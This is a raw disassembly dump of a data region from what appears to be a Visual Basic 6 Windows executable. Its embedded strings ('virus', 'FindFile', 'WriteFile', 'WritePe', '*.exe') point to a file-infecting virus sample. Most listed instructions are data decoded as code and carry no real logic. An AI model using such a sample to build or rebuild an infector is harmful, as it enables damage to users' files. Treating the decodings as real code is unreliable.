  4020e4:	9a 9c e7 ed f0 f5 fd 	lcall  $0xfdf5,$0xf0ede79c
  4020eb:	fd                   	std
  4020ec:	fe                   	(bad)
  4020ed:	fc                   	cld
  4020ee:	fe                   	(bad)
  4020ef:	fd                   	std
  4020f0:	fc                   	cld
  4020f1:	fe                   	(bad)
  4020f2:	fd                   	std
  4020f3:	fd                   	std
  4020f4:	fe                   	(bad)
  4020f5:	fe                   	(bad)
  4020f6:	ff                   	(bad)
  4020f7:	ff                   	(bad)
  4020f8:	ff                   	(bad)
  4020f9:	ff                   	(bad)
  4020fa:	ff                   	(bad)
  4020fb:	ff                   	(bad)
  4020fc:	ff                   	(bad)
  4020fd:	ff                   	(bad)
  4020fe:	ff                   	(bad)
  4020ff:	fd                   	std
  402100:	fd                   	std
  402101:	fd                   	std
	...
  402182:	24 05                	and    $0x5,%al
  402184:	00 46 6f             	add    %al,0x6f(%esi)
  402187:	72 6d                	jb     0x4021f6
  402189:	31 00                	xor    %eax,(%eax)
  40218b:	26 00 35 2d 00 00 00 	add    %dh,%es:0x2d
  402192:	b3 01                	mov    $0x1,%bl
  402194:	00 00                	add    %al,(%eax)
  402196:	db 06                	fildl  (%esi)
  402198:	00 00                	add    %al,(%eax)
  40219a:	2c 01                	sub    $0x1,%al
  40219c:	00 00                	add    %al,(%eax)
  40219e:	46                   	inc    %esi
  40219f:	02 ff                	add    %bh,%bh
  4021a1:	04 00                	add    $0x0,%al
  4021a3:	00 07                	add    %al,(%edi)
  4021a5:	00 00                	add    %al,(%eax)
  4021a7:	00 40 2a             	add    %al,0x2a(%eax)
  4021aa:	40                   	inc    %eax
  4021ab:	00 06                	add    %al,(%esi)
  4021ad:	00 00                	add    %al,(%eax)
  4021af:	00 f8                	add    %bh,%al
  4021b1:	29 40 00             	sub    %eax,0x0(%eax)
  4021b4:	01 00                	add    %eax,(%eax)
  4021b6:	02 00                	add    (%eax),%al
  4021b8:	cc                   	int3
  4021b9:	26 40                	es inc %eax
  4021bb:	00 00                	add    %al,(%eax)
  4021bd:	00 00                	add    %al,(%eax)
  4021bf:	00 ff                	add    %bh,%bh
  4021c1:	ff                   	(bad)
  4021c2:	ff                   	(bad)
  4021c3:	ff                   	(bad)
  4021c4:	ff                   	(bad)
  4021c5:	ff                   	(bad)
  4021c6:	ff                   	(bad)
  4021c7:	ff 00                	incl   (%eax)
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	00 80 27 40 00 1c    	add    %al,0x1c004027(%eax)
  4021d1:	50                   	push   %eax
  4021d2:	40                   	inc    %eax
  4021d3:	00 00                	add    %al,(%eax)
  4021d5:	00 00                	add    %al,(%eax)
  4021d7:	00 c8                	add    %cl,%al
  4021d9:	25 19 00 00 00       	and    $0x19,%eax
	...
  4021e6:	00 00                	add    %al,(%eax)
  4021e8:	ec                   	in     (%dx),%al
  4021e9:	21 40 00             	and    %eax,0x0(%eax)
  4021ec:	01 00                	add    %eax,(%eax)
  4021ee:	03 00                	add    (%eax),%eax
  4021f0:	cc                   	int3
  4021f1:	26 40                	es inc %eax
  4021f3:	00 00                	add    %al,(%eax)
  4021f5:	00 00                	add    %al,(%eax)
  4021f7:	00 ff                	add    %bh,%bh
  4021f9:	ff                   	(bad)
  4021fa:	ff                   	(bad)
  4021fb:	ff                   	(bad)
  4021fc:	ff                   	(bad)
  4021fd:	ff                   	(bad)
  4021fe:	ff                   	(bad)
  4021ff:	ff 00                	incl   (%eax)
  402201:	00 00                	add    %al,(%eax)
  402203:	00 b0 27 40 00 3c    	add    %dh,0x3c004027(%eax)
  402209:	50                   	push   %eax
  40220a:	40                   	inc    %eax
  40220b:	00 00                	add    %al,(%eax)
  40220d:	00 00                	add    %al,(%eax)
  40220f:	00 a0 09 1b 00 00    	add    %ah,0x1b09(%eax)
	...
  40221d:	00 00                	add    %al,(%eax)
  40221f:	00 24 22             	add    %ah,(%edx,%eiz,1)
  402222:	40                   	inc    %eax
  402223:	00 01                	add    %al,(%ecx)
  402225:	00 01                	add    %al,(%ecx)
  402227:	00 cc                	add    %cl,%ah
  402229:	26 40                	es inc %eax
  40222b:	00 00                	add    %al,(%eax)
  40222d:	00 00                	add    %al,(%eax)
  40222f:	00 ff                	add    %bh,%bh
  402231:	ff                   	(bad)
  402232:	ff                   	(bad)
  402233:	ff                   	(bad)
  402234:	ff                   	(bad)
  402235:	ff                   	(bad)
  402236:	ff                   	(bad)
  402237:	ff 00                	incl   (%eax)
  402239:	00 00                	add    %al,(%eax)
  40223b:	00 50 27             	add    %dl,0x27(%eax)
  40223e:	40                   	inc    %eax
  40223f:	00 2c 50             	add    %ch,(%eax,%edx,2)
  402242:	40                   	inc    %eax
  402243:	00 01                	add    %al,(%ecx)
  402245:	00 00                	add    %al,(%eax)
  402247:	00 5c 22 40          	add    %bl,0x40(%edx,%eiz,1)
	...
  402257:	00 5c 22 40          	add    %bl,0x40(%edx,%eiz,1)
  40225b:	00 00                	add    %al,(%eax)
  40225d:	00 00                	add    %al,(%eax)
  40225f:	00 50 00             	add    %dl,0x0(%eax)
  402262:	00 00                	add    %al,(%eax)
  402264:	a2 87 30 16 94       	mov    %al,0x94163087
  402269:	2f                   	das
  40226a:	45                   	inc    %ebp
  40226b:	41                   	inc    %ecx
  40226c:	94                   	xchg   %eax,%esp
  40226d:	39 9b 34 cd 08 8a    	cmp    %ebx,-0x75f732cc(%ebx)
  402273:	ce                   	into
	...
  402288:	10 00                	adc    %al,(%eax)
	...
  40229e:	00 00                	add    %al,(%eax)
  4022a0:	82 0d 00 00 00 00 00 	orb    $0x0,0x0
  4022a7:	00 20                	add    %ah,(%eax)
  4022a9:	14 40                	adc    $0x40,%al
  4022ab:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  4022af:	00 56 42             	add    %dl,0x42(%esi)
  4022b2:	35 21 1c 23 76       	xor    $0x76231c21,%eax
  4022b7:	62 36                	bound  %esi,(%esi)
  4022b9:	63 68 73             	arpl   %ebp,0x73(%eax)
  4022bc:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4022bf:	6c                   	insb   (%dx),%es:(%edi)
  4022c0:	00 00                	add    %al,(%eax)
  4022c2:	00 00                	add    %al,(%eax)
  4022c4:	2a 00                	sub    (%eax),%al
	...
  4022d2:	0a 00                	or     (%eax),%al
  4022d4:	04 08                	add    $0x8,%al
	...
  4022de:	00 00                	add    %al,(%eax)
  4022e0:	90                   	nop
  4022e1:	24 40                	and    $0x40,%al
  4022e3:	00 00                	add    %al,(%eax)
  4022e5:	f0 30 00             	lock xor %al,(%eax)
  4022e8:	00 ff                	add    %bh,%bh
  4022ea:	ff                   	(bad)
  4022eb:	ff 08                	decl   (%eax)
  4022ed:	00 00                	add    %al,(%eax)
  4022ef:	00 01                	add    %al,(%ecx)
  4022f1:	00 00                	add    %al,(%eax)
  4022f3:	00 01                	add    %al,(%ecx)
  4022f5:	00 00                	add    %al,(%eax)
  4022f7:	00 e9                	add    %ch,%cl
  4022f9:	00 00                	add    %al,(%eax)
  4022fb:	00 60 22             	add    %ah,0x22(%eax)
  4022fe:	40                   	inc    %eax
  4022ff:	00 a4 21 40 00 e4 13 	add    %ah,0x13e40040(%ecx,%eiz,1)
  402306:	40                   	inc    %eax
  402307:	00 78 00             	add    %bh,0x0(%eax)
  40230a:	00 00                	add    %al,(%eax)
  40230c:	80 00 00             	addb   $0x0,(%eax)
  40230f:	00 86 00 00 00 87    	add    %al,-0x79000000(%esi)
	...
  402325:	00 00                	add    %al,(%eax)
  402327:	00 57 72             	add    %dl,0x72(%edi)
  40232a:	69 74 65 50 65 00 b9 	imul   $0xa4b90065,0x50(%ebp,%eiz,2),%esi
  402331:	a4 
  402332:	b3 cc                	mov    $0xcc,%bl
  402334:	31 00                	xor    %eax,(%eax)
  402336:	00 b9 a4 b3 cc 31    	add    %bh,0x31ccb3a4(%ecx)
  40233c:	00 00                	add    %al,(%eax)
  40233e:	00 00                	add    %al,(%eax)
  402340:	01 00                	add    %eax,(%eax)
  402342:	00 00                	add    %al,(%eax)
  402344:	cc                   	int3
  402345:	26 40                	es inc %eax
  402347:	00 00                	add    %al,(%eax)
  402349:	00 00                	add    %al,(%eax)
  40234b:	00 c4                	add    %al,%ah
  40234d:	2c 40                	sub    $0x40,%al
  40234f:	00 ff                	add    %bh,%bh
  402351:	ff                   	(bad)
  402352:	ff                   	(bad)
  402353:	ff 00                	incl   (%eax)
  402355:	00 00                	add    %al,(%eax)
  402357:	00 20                	add    %ah,(%eax)
  402359:	27                   	daa
  40235a:	40                   	inc    %eax
  40235b:	00 08                	add    %cl,(%eax)
  40235d:	50                   	push   %eax
  40235e:	40                   	inc    %eax
  40235f:	00 00                	add    %al,(%eax)
  402361:	00 00                	add    %al,(%eax)
  402363:	00 68 75             	add    %ch,0x75(%eax)
  402366:	18 00                	sbb    %al,(%eax)
	...
  402374:	b8 23 40 00 01       	mov    $0x1004023,%eax
  402379:	00 00                	add    %al,(%eax)
  40237b:	00 28                	add    %ch,(%eax)
  40237d:	28 40 00             	sub    %al,0x0(%eax)
  402380:	00 00                	add    %al,(%eax)
  402382:	00 00                	add    %al,(%eax)
  402384:	b8 23 40 00 01       	mov    $0x1004023,%eax
  402389:	00 00                	add    %al,(%eax)
  40238b:	00 c0                	add    %al,%al
  40238d:	23 40 00             	and    0x0(%eax),%eax
  402390:	00 00                	add    %al,(%eax)
  402392:	00 00                	add    %al,(%eax)
  402394:	bc 23 40 00 01       	mov    $0x1004023,%esp
  402399:	00 00                	add    %al,(%eax)
  40239b:	00 c0                	add    %al,%al
  40239d:	23 40 00             	and    0x0(%eax),%eax
  4023a0:	01 00                	add    %eax,(%eax)
  4023a2:	b7 01                	mov    $0x1,%bh
  4023a4:	68 00 6c 00 e8       	push   $0xe8006c00
  4023a9:	23 40 00             	and    0x0(%eax),%eax
  4023ac:	14 54                	adc    $0x54,%al
  4023ae:	40                   	inc    %eax
  4023af:	00 00                	add    %al,(%eax)
  4023b1:	00 00                	add    %al,(%eax)
  4023b3:	00 58 fd             	add    %bl,-0x3(%eax)
  4023b6:	1c 00                	sbb    $0x0,%al
  4023b8:	38 28                	cmp    %ch,(%eax)
  4023ba:	40                   	inc    %eax
  4023bb:	00 48 28             	add    %cl,0x28(%eax)
  4023be:	40                   	inc    %eax
  4023bf:	00 40 00             	add    %al,0x0(%eax)
  4023c2:	1f                   	pop    %ds
  4023c3:	00 34 00             	add    %dh,(%eax,%eax,1)
  4023c6:	00 00                	add    %al,(%eax)
  4023c8:	58                   	pop    %eax
  4023c9:	28 40 00             	sub    %al,0x0(%eax)
  4023cc:	ff                   	(bad)
  4023cd:	ff                   	(bad)
  4023ce:	ff                   	(bad)
  4023cf:	ff 00                	incl   (%eax)
  4023d1:	00 00                	add    %al,(%eax)
  4023d3:	00 00                	add    %al,(%eax)
  4023d5:	00 00                	add    %al,(%eax)
  4023d7:	00 ec                	add    %ch,%ah
  4023d9:	23 40 00             	and    0x0(%eax),%eax
  4023dc:	20 3d 1c 00 68 28    	and    %bh,0x2868001c
  4023e2:	40                   	inc    %eax
  4023e3:	00 ff                	add    %bh,%bh
  4023e5:	ff                   	(bad)
  4023e6:	ff                   	(bad)
  4023e7:	ff 88 24 40 00 00    	decl   0x4024(%eax)
  4023ed:	00 00                	add    %al,(%eax)
  4023ef:	00 c0                	add    %al,%al
  4023f1:	23 40 00             	and    0x0(%eax),%eax
  4023f4:	40                   	inc    %eax
  4023f5:	23 40 00             	and    0x0(%eax),%eax
  4023f8:	c0 13 40             	rclb   $0x40,(%ebx)
  4023fb:	00 c6                	add    %al,%dh
  4023fd:	13 40 00             	adc    0x0(%eax),%eax
  402400:	cc                   	int3
  402401:	13 40 00             	adc    0x0(%eax),%eax
	...
  40241c:	80 24 40 00          	andb   $0x0,(%eax,%eax,2)
	...
  402480:	81 6c 24 04 33 00 00 	subl   $0x33,0x4(%esp)
  402487:	00 
  402488:	e9 93 08 00 00       	jmp    0x402d20
  40248d:	00 00                	add    %al,(%eax)
  40248f:	00 f4                	add    %dh,%ah
  402491:	01 00                	add    %eax,(%eax)
  402493:	00 cc                	add    %cl,%ah
  402495:	26 40                	es inc %eax
  402497:	00 00                	add    %al,(%eax)
  402499:	00 00                	add    %al,(%eax)
  40249b:	00 10                	add    %dl,(%eax)
  40249d:	2d 40 00 70 3a       	sub    $0x3a700040,%eax
  4024a2:	40                   	inc    %eax
  4024a3:	00 14 0b             	add    %dl,(%ebx,%ecx,1)
  4024a6:	00 00                	add    %al,(%eax)
  4024a8:	08 50 40             	or     %dl,0x40(%eax)
  4024ab:	00 16                	add    %dl,(%esi)
  4024ad:	12 40 00             	adc    0x0(%eax),%al
  4024b0:	00 50 40             	add    %dl,0x40(%eax)
	...
  4026c3:	00 a4 21 40 00 02 00 	add    %ah,0x20040(%ecx,%eiz,1)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 00                	add    %al,(%eax)
  4026ce:	00 00                	add    %al,(%eax)
  4026d0:	5c                   	pop    %esp
  4026d1:	50                   	push   %eax
  4026d2:	40                   	inc    %eax
  4026d3:	00 90 2c 40 00 ff    	add    %dl,-0xffbfd4(%eax)
  4026d9:	ff                   	(bad)
  4026da:	ff                   	(bad)
  4026db:	ff 00                	incl   (%eax)
  4026dd:	00 00                	add    %al,(%eax)
  4026df:	00 4c 50 40          	add    %cl,0x40(%eax,%edx,2)
  4026e3:	00 af 31 4a 7a 07    	add    %ch,0x77a4a31(%edi)
  4026e9:	4e                   	dec    %esi
  4026ea:	3c 48                	cmp    $0x48,%al
  4026ec:	b2 d5                	mov    $0xd5,%dl
  4026ee:	47                   	inc    %edi
  4026ef:	78 e7                	js     0x4026d8
  4026f1:	60                   	pusha
  4026f2:	1f                   	pop    %ds
  4026f3:	21 0a                	and    %ecx,(%edx)
  4026f5:	00 04 00             	add    %al,(%eax,%eax,1)
  4026f8:	04 00                	add    $0x0,%al
  4026fa:	04 00                	add    $0x0,%al
  4026fc:	20 27                	and    %ah,(%edi)
  4026fe:	40                   	inc    %eax
	...
  40270b:	00 08                	add    %cl,(%eax)
  40270d:	28 40 00             	sub    %al,0x0(%eax)
  402710:	09 04 00             	or     %eax,(%eax,%eax,1)
  402713:	00 04 08             	add    %al,(%eax,%ecx,1)
  402716:	00 00                	add    %al,(%eax)
  402718:	00 00                	add    %al,(%eax)
  40271a:	00 00                	add    %al,(%eax)
  40271c:	02 00                	add    (%eax),%al
  40271e:	00 00                	add    %al,(%eax)
  402720:	40                   	inc    %eax
  402721:	23 40 00             	and    0x0(%eax),%eax
  402724:	ff                   	(bad)
  402725:	ff                   	(bad)
  402726:	ff                   	(bad)
  402727:	ff d0                	call   *%eax
  402729:	28 40 00             	sub    %al,0x0(%eax)
	...
  402738:	e4 27                	in     $0x27,%al
  40273a:	40                   	inc    %eax
  40273b:	00 01                	add    %al,(%ecx)
  40273d:	00 00                	add    %al,(%eax)
  40273f:	00 e0                	add    %ah,%al
  402741:	27                   	daa
  402742:	40                   	inc    %eax
  402743:	00 ff                	add    %bh,%bh
  402745:	ff 00                	incl   (%eax)
  402747:	00 83 80 01 00 00    	add    %al,0x180(%ebx)
  40274d:	00 00                	add    %al,(%eax)
  40274f:	00 24 22             	add    %ah,(%edx,%eiz,1)
  402752:	40                   	inc    %eax
  402753:	00 ff                	add    %bh,%bh
  402755:	ff                   	(bad)
  402756:	ff                   	(bad)
  402757:	ff                   	(bad)
  402758:	38 29                	cmp    %ch,(%ecx)
  40275a:	40                   	inc    %eax
  40275b:	00 00                	add    %al,(%eax)
  40275d:	00 00                	add    %al,(%eax)
  40275f:	00 34 50             	add    %dh,(%eax,%edx,2)
  402762:	40                   	inc    %eax
  402763:	00 00                	add    %al,(%eax)
  402765:	00 00                	add    %al,(%eax)
  402767:	00 ec                	add    %ch,%ah
  402769:	27                   	daa
  40276a:	40                   	inc    %eax
  40276b:	00 01                	add    %al,(%ecx)
  40276d:	00 00                	add    %al,(%eax)
  40276f:	00 00                	add    %al,(%eax)
  402771:	00 00                	add    %al,(%eax)
  402773:	00 ff                	add    %bh,%bh
  402775:	ff 00                	incl   (%eax)
  402777:	00 01                	add    %al,(%ecx)
  402779:	80 01 00             	addb   $0x0,(%ecx)
  40277c:	00 00                	add    %al,(%eax)
  40277e:	00 00                	add    %al,(%eax)
  402780:	b4 21                	mov    $0x21,%ah
  402782:	40                   	inc    %eax
  402783:	00 ff                	add    %bh,%bh
  402785:	ff                   	(bad)
  402786:	ff                   	(bad)
  402787:	ff                   	(bad)
  402788:	38 29                	cmp    %ch,(%ecx)
  40278a:	40                   	inc    %eax
  40278b:	00 00                	add    %al,(%eax)
  40278d:	00 00                	add    %al,(%eax)
  40278f:	00 24 50             	add    %ah,(%eax,%edx,2)
  402792:	40                   	inc    %eax
  402793:	00 00                	add    %al,(%eax)
  402795:	00 00                	add    %al,(%eax)
  402797:	00 f0                	add    %dh,%al
  402799:	27                   	daa
  40279a:	40                   	inc    %eax
  40279b:	00 03                	add    %al,(%ebx)
  40279d:	00 00                	add    %al,(%eax)
  40279f:	00 00                	add    %al,(%eax)
  4027a1:	00 00                	add    %al,(%eax)
  4027a3:	00 ff                	add    %bh,%bh
  4027a5:	ff 00                	incl   (%eax)
  4027a7:	00 01                	add    %al,(%ecx)
  4027a9:	80 01 00             	addb   $0x0,(%ecx)
  4027ac:	00 00                	add    %al,(%eax)
  4027ae:	00 00                	add    %al,(%eax)
  4027b0:	ec                   	in     (%dx),%al
  4027b1:	21 40 00             	and    %eax,0x0(%eax)
  4027b4:	ff                   	(bad)
  4027b5:	ff                   	(bad)
  4027b6:	ff                   	(bad)
  4027b7:	ff                   	(bad)
  4027b8:	38 29                	cmp    %ch,(%ecx)
  4027ba:	40                   	inc    %eax
  4027bb:	00 00                	add    %al,(%eax)
  4027bd:	00 00                	add    %al,(%eax)
  4027bf:	00 44 50 40          	add    %al,0x40(%eax,%edx,2)
  4027c3:	00 00                	add    %al,(%eax)
  4027c5:	00 00                	add    %al,(%eax)
  4027c7:	00 fc                	add    %bh,%ah
  4027c9:	27                   	daa
  4027ca:	40                   	inc    %eax
  4027cb:	00 01                	add    %al,(%ecx)
  4027cd:	00 00                	add    %al,(%eax)
  4027cf:	00 00                	add    %al,(%eax)
  4027d1:	00 00                	add    %al,(%eax)
  4027d3:	00 ff                	add    %bh,%bh
  4027d5:	ff 00                	incl   (%eax)
  4027d7:	00 01                	add    %al,(%ecx)
  4027d9:	80 01 00             	addb   $0x0,(%ecx)
	...
  4027e4:	76 69                	jbe    0x40284f
  4027e6:	72 75                	jb     0x40285d
  4027e8:	73 00                	jae    0x4027ea
  4027ea:	00 00                	add    %al,(%eax)
  4027ec:	41                   	inc    %ecx
  4027ed:	50                   	push   %eax
  4027ee:	49                   	dec    %ecx
  4027ef:	00 46 69             	add    %al,0x69(%esi)
  4027f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4027f3:	64 46                	fs inc %esi
  4027f5:	69 6c 65 00 00 00 00 	imul   $0x57000000,0x0(%ebp,%eiz,2),%ebp
  4027fc:	57 
  4027fd:	72 69                	jb     0x402868
  4027ff:	74 65                	je     0x402866
  402801:	46                   	inc    %esi
  402802:	69 6c 65 00 00 00 b9 	imul   $0xa4b90000,0x0(%ebp,%eiz,2),%ebp
  402809:	a4 
  40280a:	b3 cc                	mov    $0xcc,%bl
  40280c:	31 00                	xor    %eax,(%eax)
	...
  402816:	00 00                	add    %al,(%eax)
  402818:	13 92 af 4e 0c ca    	adc    -0x35f3b151(%edx),%edx
  40281e:	b4 43                	mov    $0x43,%ah
  402820:	9c                   	pushf
  402821:	ae                   	scas   %es:(%edi),%al
  402822:	68 87 99 1e 80       	push   $0x801e9987
  402827:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402828:	2b 48 01             	sub    0x1(%eax),%ecx
  40282b:	c1 c0 be             	rol    $0xbe,%eax
  40282e:	35 49 80 45 6d       	xor    $0x6d458049,%eax
  402833:	37                   	aaa
  402834:	a9 85 fd 54 a2       	test   $0xa254fd85,%eax
  402839:	87 30                	xchg   %esi,(%eax)
  40283b:	16                   	push   %ss
  40283c:	94                   	xchg   %eax,%esp
  40283d:	2f                   	das
  40283e:	45                   	inc    %ebp
  40283f:	41                   	inc    %ecx
  402840:	94                   	xchg   %eax,%esp
  402841:	39 9b 34 cd 08 8a    	cmp    %ebx,-0x75f732cc(%ebx)
  402847:	ce                   	into
  402848:	6b b6 95 02 94 ea f4 	imul   $0xfffffff4,-0x156bfd6b(%esi),%esi
  40284f:	46                   	inc    %esi
  402850:	a2 12 19 d2 e5       	mov    %al,0xe5d21912
  402855:	1b ce                	sbb    %esi,%ecx
  402857:	45                   	inc    %ebp
  402858:	3a 4f ad             	cmp    -0x53(%edi),%cl
  40285b:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  402861:	0c 00                	or     $0x0,%al
  402863:	aa                   	stos   %al,%es:(%edi)
  402864:	00 60 d3             	add    %ah,-0x2d(%eax)
  402867:	93                   	xchg   %eax,%ebx
  402868:	46                   	inc    %esi
  402869:	6f                   	outsl  %ds:(%esi),(%dx)
  40286a:	72 6d                	jb     0x4028d9
  40286c:	00 00                	add    %al,(%eax)
  40286e:	00 00                	add    %al,(%eax)
  402870:	2e 3d fb fc fa a0    	cs cmp $0xa0fafcfb,%eax
  402876:	68 10 a7 38 08       	push   $0x838a710
  40287b:	00 2b                	add    %ch,(%ebx)
  40287d:	33 71 b5             	xor    -0x4b(%ecx),%esi
  402880:	43                   	inc    %ebx
  402881:	3a 5c 50 72          	cmp    0x72(%eax,%edx,2),%bl
  402885:	6f                   	outsl  %ds:(%esi),(%dx)
  402886:	67 72 61             	addr16 jb 0x4028ea
  402889:	6d                   	insl   (%dx),%es:(%edi)
  40288a:	20 46 69             	and    %al,0x69(%esi)
  40288d:	6c                   	insb   (%dx),%es:(%edi)
  40288e:	65 73 5c             	gs jae 0x4028ed
  402891:	56                   	push   %esi
  402892:	42                   	inc    %edx
  402893:	be ab bc f2 b0       	mov    $0xb0f2bcab,%esi
  402898:	e6 5c                	out    %al,$0x5c
  40289a:	56                   	push   %esi
  40289b:	42                   	inc    %edx
  40289c:	36 2e 4f             	ss cs dec %edi
  40289f:	4c                   	dec    %esp
  4028a0:	42                   	inc    %edx
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	00 56 42             	add    %dl,0x42(%esi)
  4028a6:	00 00                	add    %al,(%eax)
  4028a8:	70 28                	jo     0x4028d2
  4028aa:	40                   	inc    %eax
  4028ab:	00 00                	add    %al,(%eax)
  4028ad:	00 00                	add    %al,(%eax)
  4028af:	00 06                	add    %al,(%esi)
  4028b1:	00 00                	add    %al,(%eax)
  4028b3:	00 09                	add    %cl,(%ecx)
  4028b5:	00 00                	add    %al,(%eax)
  4028b7:	00 80 28 40 00 a4    	add    %al,-0x5bffbfd8(%eax)
  4028bd:	28 40 00             	sub    %al,0x0(%eax)
  4028c0:	fc                   	cld
  4028c1:	53                   	push   %ebx
  4028c2:	40                   	inc    %eax
	...
  4028cb:	00 88 ae 18 00 0c    	add    %cl,0xc0018ae(%eax)
  4028d1:	00 40 00             	add    %al,0x0(%eax)
	...
  4028dc:	23 3d fb fc fa a0    	and    0xa0fafcfb,%edi
  4028e2:	68 10 a7 38 08       	push   $0x838a710
  4028e7:	00 2b                	add    %ch,(%ebx)
  4028e9:	33 71 b5             	xor    -0x4b(%ecx),%esi
  4028ec:	22 3d fb fc fa a0    	and    0xa0fafcfb,%bh
  4028f2:	68 10 a7 38 08       	push   $0x838a710
  4028f7:	00 2b                	add    %ch,(%ebx)
  4028f9:	33 71 b5             	xor    -0x4b(%ecx),%esi
  4028fc:	02 00                	add    (%eax),%al
  4028fe:	00 00                	add    %al,(%eax)
  402900:	dc 28                	fsubrl (%eax)
  402902:	40                   	inc    %eax
  402903:	00 ec                	add    %ch,%ah
  402905:	28 40 00             	sub    %al,0x0(%eax)
  402908:	00 00                	add    %al,(%eax)
  40290a:	00 00                	add    %al,(%eax)
  40290c:	79 4f                	jns    0x40295d
  40290e:	ad                   	lods   %ds:(%esi),%eax
  40290f:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  402915:	0c 00                	or     $0x0,%al
  402917:	aa                   	stos   %al,%es:(%edi)
  402918:	00 60 d3             	add    %ah,-0x2d(%eax)
  40291b:	93                   	xchg   %eax,%ebx
  40291c:	04 00                	add    $0x0,%al
  40291e:	00 00                	add    %al,(%eax)
  402920:	3a 00                	cmp    (%eax),%al
  402922:	5c                   	pop    %esp
  402923:	00 00                	add    %al,(%eax)
  402925:	00 00                	add    %al,(%eax)
  402927:	00 0a                	add    %cl,(%edx)
  402929:	00 00                	add    %al,(%eax)
  40292b:	00 2a                	add    %ch,(%edx)
  40292d:	00 2e                	add    %ch,(%esi)
  40292f:	00 65 00             	add    %ah,0x0(%ebp)
  402932:	78 00                	js     0x402934
  402934:	65 00 00             	add    %al,%gs:(%eax)
  402937:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40293a:	08 00                	or     %al,(%eax)
	...
  402944:	56                   	push   %esi
  402945:	42                   	inc    %edx
  402946:	41                   	inc    %ecx
  402947:	36 2e 44             	ss cs inc %esp
  40294a:	4c                   	dec    %esp
  40294b:	4c                   	dec    %esp
  40294c:	00 00                	add    %al,(%eax)
  40294e:	00 00                	add    %al,(%eax)
  402950:	5f                   	pop    %edi
  402951:	5f                   	pop    %edi
  402952:	76 62                	jbe    0x4029b6
  402954:	61                   	popa
  402955:	45                   	inc    %ebp
  402956:	72 72                	jb     0x4029ca
  402958:	6f                   	outsl  %ds:(%esi),(%dx)
  402959:	72 4f                	jb     0x4029aa
  40295b:	76 65                	jbe    0x4029c2
  40295d:	72 66                	jb     0x4029c5
  40295f:	6c                   	insb   (%dx),%es:(%edi)
  402960:	6f                   	outsl  %ds:(%esi),(%dx)
  402961:	77 00                	ja     0x402963
  402963:	00 5f 5f             	add    %bl,0x5f(%edi)
  402966:	76 62                	jbe    0x4029ca
  402968:	61                   	popa
  402969:	46                   	inc    %esi
  40296a:	72 65                	jb     0x4029d1
  40296c:	65 56                	gs push %esi
  40296e:	61                   	popa
  40296f:	72 4c                	jb     0x4029bd
  402971:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  402978:	5f                   	pop    %edi
  402979:	5f                   	pop    %edi
  40297a:	76 62                	jbe    0x4029de
  40297c:	61                   	popa
  40297d:	46                   	inc    %esi
  40297e:	72 65                	jb     0x4029e5
  402980:	65 53                	gs push %ebx
  402982:	74 72                	je     0x4029f6
  402984:	4c                   	dec    %esp
  402985:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  40298c:	5f                   	pop    %edi
  40298d:	5f                   	pop    %edi
  40298e:	76 62                	jbe    0x4029f2
  402990:	61                   	popa
  402991:	56                   	push   %esi
  402992:	61                   	popa
  402993:	72 43                	jb     0x4029d8
  402995:	61                   	popa
  402996:	74 00                	je     0x402998
  402998:	5f                   	pop    %edi
  402999:	5f                   	pop    %edi
  40299a:	76 62                	jbe    0x4029fe
  40299c:	61                   	popa
  40299d:	53                   	push   %ebx
  40299e:	74 72                	je     0x402a12
  4029a0:	56                   	push   %esi
  4029a1:	61                   	popa
  4029a2:	72 56                	jb     0x4029fa
  4029a4:	61                   	popa
  4029a5:	6c                   	insb   (%dx),%es:(%edi)
  4029a6:	00 00                	add    %al,(%eax)
  4029a8:	5f                   	pop    %edi
  4029a9:	5f                   	pop    %edi
  4029aa:	76 62                	jbe    0x402a0e
  4029ac:	61                   	popa
  4029ad:	53                   	push   %ebx
  4029ae:	74 72                	je     0x402a22
  4029b0:	43                   	inc    %ebx
  4029b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4029b2:	70 79                	jo     0x402a2d
  4029b4:	00 00                	add    %al,(%eax)
  4029b6:	00 00                	add    %al,(%eax)
  4029b8:	5f                   	pop    %edi
  4029b9:	5f                   	pop    %edi
  4029ba:	76 62                	jbe    0x402a1e
  4029bc:	61                   	popa
  4029bd:	53                   	push   %ebx
  4029be:	74 72                	je     0x402a32
  4029c0:	54                   	push   %esp
  4029c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c2:	55                   	push   %ebp
  4029c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4029c4:	69 63 6f 64 65 00 00 	imul   $0x6564,0x6f(%ebx),%esp
  4029cb:	00 5f 5f             	add    %bl,0x5f(%edi)
  4029ce:	76 62                	jbe    0x402a32
  4029d0:	61                   	popa
  4029d1:	53                   	push   %ebx
  4029d2:	74 72                	je     0x402a46
  4029d4:	56                   	push   %esi
  4029d5:	61                   	popa
  4029d6:	72 4d                	jb     0x402a25
  4029d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4029d9:	76 65                	jbe    0x402a40
  4029db:	00 5f 5f             	add    %bl,0x5f(%edi)
  4029de:	76 62                	jbe    0x402a42
  4029e0:	61                   	popa
  4029e1:	46                   	inc    %esi
  4029e2:	72 65                	jb     0x402a49
  4029e4:	65 4f                	gs dec %edi
  4029e6:	62 6a 00             	bound  %ebp,0x0(%edx)
  4029e9:	00 00                	add    %al,(%eax)
  4029eb:	00 5f 5f             	add    %bl,0x5f(%edi)
  4029ee:	76 62                	jbe    0x402a52
  4029f0:	61                   	popa
  4029f1:	4e                   	dec    %esi
  4029f2:	65 77 32             	gs ja  0x402a27
  4029f5:	00 00                	add    %al,(%eax)
  4029f7:	00 dc                	add    %bl,%ah
  4029f9:	28 40 00             	sub    %al,0x0(%eax)
  4029fc:	00 54 40 00          	add    %dl,0x0(%eax,%eax,2)
  402a00:	5f                   	pop    %edi
  402a01:	5f                   	pop    %edi
